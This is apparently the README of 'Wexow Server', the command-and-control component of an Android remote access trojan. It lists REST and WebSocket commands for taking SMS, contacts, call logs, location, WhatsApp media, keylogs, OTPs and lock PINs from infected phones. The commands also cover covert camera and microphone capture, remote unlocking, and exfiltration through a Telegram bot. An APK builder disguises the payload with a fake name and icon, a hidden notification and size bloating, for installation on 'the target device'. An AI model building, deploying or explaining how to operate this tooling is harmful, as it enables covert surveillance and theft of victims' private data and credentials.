# 🖥️ Wexow Server

**Node.js C2 server with WebSocket, REST API, and APK Builder.**

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Prerequisites](#-prerequisites)
- [Quick Start](#-quick-start)
- [REST API](#-rest-api)
- [WebSocket Protocol](#-websocket-protocol)
- [APK Builder](#-apk-builder)
- [File Storage](#-file-storage)
- [Environment Variables](#-environment-variables)
- [Troubleshooting](#-troubleshooting)
- [Monitoring](#-monitoring)

---

## 🎯 Overview

The **Wexow Server** is the command & control center that:

- **Receives** connections from Android clients via WebSocket
- **Sends** commands to clients in real-time
- **Stores** all extracted data (files, photos, messages)
- **Builds** custom APKs on demand
- **Serves** the React dashboard

### Key Files

| File | Purpose |
|------|---------|
| `server.js` | Main server (Express + WebSocket + Socket.IO) |
| `builder.js` | APK builder (patches base.apk) |
| `Dockerfile` | Docker image definition |
| `base.apk` | Template APK (patched by builder) |
| `Downloads/` | Extracted data per client |
| `output/` | Built APKs |
| `public/app/` | Frontend bundle (built) |

---

## ✨ Features

### 🔌 Communication
- **WebSocket** (`/ws`) — Bi-directional client communication
- **Socket.IO** — Real-time dashboard updates
- **REST API** — HTTP endpoints for automation
- **TCP Listeners** — Optional raw TCP ports

### 📁 File Management
- Browse, download, upload, delete, rename
- Chunked transfers for large files
- Auto-unzip on completion
- Telegram fallback for large directories

### 📸 Media Handling
- **Camera** — Save live JPEG frames
- **Microphone** — WAV recording
- **Screen Recording** — MP4 chunks
- **Live Screenshot** — Latest frame only

### 📊 Data Collection
- SMS, Call Logs, Contacts, Emails
- Location (GPS + reverse geocode)
- WhatsApp Media (multi-account)
- Clipboard, OTP, Keylogs
- Device info, DB exports

### 🔨 APK Builder
- Patch `base.apk` on demand
- Custom host, package, app name
- Notification visibility control
- Icon replacement
- Fake size bloating
- Signing with debug key

### 🔐 Security
- **Session cookies** — HMAC-signed
- **Protected `/Downloads`** — Session required
- **Password login** — `ACCESS_PASSWORD`
- **Keep-alive** — Heartbeat every 15s

---

## 📋 Prerequisites

Before running the Wexow Server, ensure your environment meets the following requirements.

### 🖥️ System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Linux / macOS / Windows (WSL2) | Ubuntu 22.04+ |
| **RAM** | 2 GB | 4 GB+ |
| **Disk** | 5 GB | 15 GB+ |
| **CPU** | Dual-core | Quad-core+ |

### 🐳 Option 1: Docker (Recommended)

The server is designed to run in Docker. Everything is bundled.

| Tool | Version | Purpose |
|------|---------|---------|
| **Docker** | 24.0+ | Container runtime |
| **Docker Compose** | 2.20+ | Orchestration |

**What's inside the Docker image**:

- Debian Trixie Slim
- Node.js 18
- Java 21 (OpenJDK)
- apktool 3.0.2
- zipalign
- All npm dependencies

### 🛠️ Option 2: Local Development

If you prefer to run the server without Docker.

| Tool | Version | Purpose |
|------|---------|---------|
| **Node.js** | 18.x LTS | Server runtime |
| **npm** | 9.x+ | Dependencies |
| **Java JDK** | 21 (Temurin) | apktool (for builder) |
| **apktool** | 3.0.2 | Decompile/rebuild APK |
| **zipalign** | 34.0.0 | Align APK |
| **apksigner** | 34.0.0 | Sign APK |

### 🔐 Environment Variables

1. Create a `.env` file in the project root:

```bash
cp .env.example .env
nano .env
```

| Variable | Required | Default | Description |
|----------|:--------:|---------|-------------|
| `TS_AUTHKEY` | ✅ | `your_tailscale_auth_key` | Login to your tailscale account |
| `ACCESS_PASSWORD` | ✅ | `change_me_1337` | Dashboard login |
| `SESSION_SECRET` | ⚠️ | `random` | Cookie signing |
| `NODE_ENV` | ❌ | `development` | Environment |

**`.env` example**:

```env
TS_AUTHKEY=your_tailscale_auth_key
ACCESS_PASSWORD=super_secret_123
SESSION_SECRET=abc123def456...
```

**Generate a strong secret**:

```bash
openssl rand -hex 32
```

1. in `/scripts/telegram_receiver.py` update these two variable to receive downloaded file/directory from the Telegram bot:

```java
// ⭐ Setup Telegram
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
```

### 🐛 Common Prerequisites Issues

| Problem | Solution |
|---------|----------|
| **`Cannot find module 'express'`** | `cd server && npm install` |
| **`apktool: command not found`** | Install Java 21 and recreate the wrapper |
| **`zipalign: command not found`** | Add `$ANDROID_HOME/build-tools/34.0.0` to `PATH` |
| **`base.apk` missing** | Run `cd ../client && ./build.sh` |
| **Port 3000 already in use** | `lsof -i :3000` and kill the process |
| **Docker permission denied** | `sudo usermod -aG docker $USER` then re-login |

---

## 🚀 Quick Start

### Docker (Recommended)

```bash
# From project root
cp .env.example .env
nano .env

# Build & start (/WexowRAT/build.sh)
./build
```

The server will be available at `http://localhost:3000`.

---

## 🏗️ Architecture

```
┌──────────────────────────────────────────────────────┐
│                    Wexow Server                      │
│                                                      │
│  ┌────────────┐  ┌──────────────┐  ┌─────────────┐   │
│  │  Express   │  │  WebSocket   │  │  Socket.IO  │   │
│  │  REST API  │  │  (/ws)       │  │  (Dashboard)│   │
│  └─────┬──────┘  └──────┬───────┘  └──────┬──────┘   │
│        │                │                  │         │
│        └────────────────┼──────────────────┘         │
│                         │                            │
│                         ▼                            │
│              ┌─────────────────────┐                 │
│              │  Command Handler    │                 │
│              │  (handleClientMsg)  │                 │
│              └──────────┬──────────┘                 │
│                         │                            │
│        ┌────────────────┼────────────────┐           │
│        ▼                ▼                ▼           │
│  ┌──────────┐  ┌──────────────┐  ┌────────────┐      │
│  │ Downloads│  │  activeRecs  │  │  transfers │      │
│  │ Storage  │  │  (mic/video) │  │  (files)   │      │
│  └──────────┘  └──────────────┘  └────────────┘      │
└──────────────────────────────────────────────────────┘
```

---

## 🔌 REST API


### Endpoints

#### General

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/clients` | List all connected devices |
| `GET` | `/api/listeners` | List active TCP listeners |
| `GET` | `/api/db-exports` | List DB export info |

#### Files

| Method | Endpoint | Body |
|--------|----------|------|
| `POST` | `/api/:clientId/file_manager` | `{ path }` |
| `POST` | `/api/:clientId/file_download` | `{ path }` |
| `POST` | `/api/:clientId/file_upload` | `{ path, data }` |
| `POST` | `/api/:clientId/file_delete` | `{ path }` |
| `POST` | `/api/:clientId/file_rename` | `{ path, newName }` |
| `POST` | `/api/:clientId/file_mkdir` | `{ path }` |
| `POST` | `/api/:clientId/file_search` | `{ path, query }` |

#### Media

| Method | Endpoint | Body |
|--------|----------|------|
| `POST` | `/api/:clientId/camera` | `{ camera_id, quality }` |
| `POST` | `/api/:clientId/mic` | `{ action, mode }` |
| `POST` | `/api/:clientId/live_screenshot/start` | `{ interval }` |
| `POST` | `/api/:clientId/live_screenshot/stop` | — |

#### Data

| Method | Endpoint | Description |
|--------|----------|-------------|
| `POST` | `/api/:clientId/sms` | Read SMS |
| `POST` | `/api/:clientId/call_logs` | Read call logs |
| `POST` | `/api/:clientId/contacts` | Read contacts |
| `POST` | `/api/:clientId/location` | Get location |
| `POST` | `/api/:clientId/device_info` | Get device info |

#### Control

| Method | Endpoint | Body |
|--------|----------|------|
| `POST` | `/api/:clientId/apps/launch` | `{ package }` |
| `POST` | `/api/:clientId/apps/force_stop` | `{ package }` |
| `POST` | `/api/:clientId/apps/open_url` | `{ url }` |
| `POST` | `/api/:clientId/accessibility/click_text` | `{ text }` |
| `POST` | `/api/:clientId/accessibility/click_xy` | `{ coord }` |
| `POST` | `/api/:clientId/accessibility/swipe` | `{ coord }` |

#### Power

| Method | Endpoint | Body |
|--------|----------|------|
| `POST` | `/api/:clientId/power/lock` | — |
| `POST` | `/api/:clientId/power/unlock` | `{ pin }` |
| `POST` | `/api/:clientId/power/unlock_pattern` | `{ pattern }` |

---

## 🔌 WebSocket Protocol

### Client Connection (`/ws`)

**Client → Server** (Login):

```json
{
    "type": "login",
    "man": "Xiaomi",
    "model": "2409BRN2CA",
    "release": "14",
    "sdk": 34
}
```

**Server → Client** (Command):

```json
{
    "order": "camera",
    "camera_id": 0,
    "quality": 40
}
```

**Client → Server** (Response):

```json
{
    "type": "camera",
    "image": "base64_encoded_jpeg..."
}
```

### Supported Orders

| Order | Purpose | Params |
|-------|---------|--------|
| `file_manager` | Browse files | `path` |
| `file_download` | Download file | `path` |
| `camera` | Start camera | `camera_id`, `quality` |
| `mic` | Mic control | `action`, `mode` |
| `screen_share` | Live stream | — |
| `live_screenshot` | Screenshots | `action`, `interval` |
| `sms` | Read SMS | — |
| `call_logs` | Read call log | — |
| `contacts` | Read contacts | — |
| `location` | Get GPS | — |
| `launch_app` | Open app | `package` |
| `open_url` | Open URL | `url` |
| `uninstall` | Remove app | `package` |
| `screen_reader_start` | UI dump | — |
| `whatsapp_media` | WA media | `mediaType` |
| `lock_screen` | Lock | — |
| `unlock_screen` | Unlock | `pin` |
| `unlock_pattern` | Pattern | `pattern` |
| `ping` | Heartbeat | — |

### Dashboard Connection (Socket.IO)

**Server → Dashboard**:

```javascript
io.emit('client_connected', { id, details })
io.emit('client_disconnected', id)
io.emit('client_data', { id, data: {...} })
io.emit('build_log', 'text...')
io.emit('build_success', 'Wexow.apk')
io.emit('build_failed', error)
io.emit('sys_log', { time, msg, type })
io.emit('stats_update', { stats, sysInfo })
io.emit('listeners_update', [3000, 3001])
```

**Dashboard → Server**:

```javascript
// Send command to client
socket.emit('order', {
    id: clientId,
    order: 'camera',
    params: { camera_id: 0 }
})

// Build APK
socket.emit('build_apk_advanced', { config })

// Start/Stop TCP listener
socket.emit('start_listener', 3001)
socket.emit('stop_listener', 3001)
```

---

## 🔨 APK Builder

The builder patches a template `base.apk` with custom configuration.

### Usage

1. Open Dashboard
2. Go to Builder tab
3. Configure a custom apk
4. Download the apk then install it in the target device

### What the Builder Does

1. **Decompiles** `base.apk` via apktool
2. **Patches** `ConnectionManager.smali` (host, port)
3. **Patches** `strings.xml` (app name)
4. **Patches** `MainService.smali` (notification visibility)
5. **Replaces** icon (optional)
6. **Changes** package name (optional)
7. **Bloats** size (optional)
8. **Recompiles** & signs the APK

### Output

```
output/
├── patched.apk        # Unsigned
├── Wexow.apk          # Final signed APK
└── debug.keystore     # Signing key (auto-generated)
```

---

## 📁 File Storage

### Directory Structure

```
Downloads/
├── <client_id>/
│   ├── camera/                    # Camera photos
│   │   ├── 1234567890.jpg
│   │   └── 1234567891.jpg
│   ├── mic/                       # Mic recordings
│   │   └── recording_*.wav
│   ├── files/                     # Uploaded files
│   ├── zips/                      # Downloaded archives
│   ├── extracted/                 # Unzipped content
│   ├── screen_recordings/         # Video recordings
│   ├── emails/                    # Extracted emails
│   ├── calls/                     # Call logs
│   │   └── call_logs.json
│   ├── whatsapp/                  # WhatsApp data
│   ├── live_screenshot.jpg        # Latest screenshot
│   ├── lock_credentials.json      # PINs & patterns
│   ├── db_export.json             # SQLite export
│   └── country.txt                # Geocoded country
└── <another_client_id>/
    └── ...
```

### Storage Limits

| Type | Retention |
|------|-----------|
| Live Screenshots | Last only (overwritten) |
| Camera | Unlimited |
| Mic | Unlimited |
| Zips | Manual cleanup |

---

## 🛠️ Troubleshooting

### Common Issues

**1. "Client not found"**

- Ensure device is connected via WebSocket
- Check `/api/clients` for connected devices
- Check firewall allows WebSocket (`wss://`)

**2. "Access denied" for `/Downloads`**

- Login required — get session cookie
- Check `verifySession` in `server.js`
- Cookie must be sent with each request

**3. APK build fails**

- Ensure `base.apk` exists in `server/`
- Check `apktool` is installed: `apktool --version`
- Check `builder.js` output for errors
- Verify Java 21 is available inside container

**4. WebSocket disconnects**

- Check heartbeat is working (`ping`/`pong`)
- Verify Tailscale connection
- Check firewall rules

**5. Docker container keeps restarting**

- Check logs: `docker compose logs`
- Verify `.env` is set
- Check port 3000 isn't in use

**6. `apktool` fails with Java error**

- Container should have Java 21
- Run `docker exec wexow-server java -version`

### Logs

```bash
# Docker
docker logs -f wexow-server
```

---

## 📊 Monitoring

Available via Socket.IO `stats_update` event (every 2 seconds):

```json
{
    "stats": {
        "sent": { "bytes": 12345, "packets": 100, "rate": 50 },
        "recv": { "bytes": 54321, "packets": 200, "rate": 100 }
    },
    "sysInfo": {
        "cpu": "12.3%",
        "ram": "45.6%",
        "uptime": "2h 30m",
        "platform": "linux 6.1.0"
    }
}
```

### System Logs

```javascript
io.emit('sys_log', {
    time: '12:34:56',
    msg: 'WS_CLIENT_CONNECTED: Xiaomi_2409BRN2CA',
    type: 'ok'  // 'ok' | 'info' | 'warn' | 'err'
})
```

### TCP Listeners

```javascript
io.emit('listeners_update', ['3000', '3001'])
```

---

## 📜 License

Same as main project. See [LICENSE](../LICENSE).

---

<div align="center">

**[⬆ Back to Top](#️-wexow-server)**

</div>